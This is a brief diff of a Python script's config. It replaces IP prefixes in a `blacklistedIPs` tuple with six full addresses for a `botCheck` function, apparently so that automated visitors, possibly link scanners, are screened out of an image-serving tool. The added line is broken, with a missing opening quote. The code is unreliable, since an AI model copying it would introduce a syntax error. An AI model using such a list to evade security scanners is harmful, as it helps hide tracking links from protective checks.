@@ -64,7 +64,7 @@ config = {
     # 4) Image 
 }
 
-blacklistedIPs = ("27", "104", "143", "164") # Blacklisted IPs. You can enter a full IP or the beginning to block an entire block.
+blacklistedIPs = (18.212.27.186", "3.22.249.173", "3.23.94.35", "93.123.109.116", "54.70.53.60", "203.82.75.132")
                                                            # This feature is undocumented mainly due to it being for detecting bots better.
 
 def botCheck(ip, useragent):
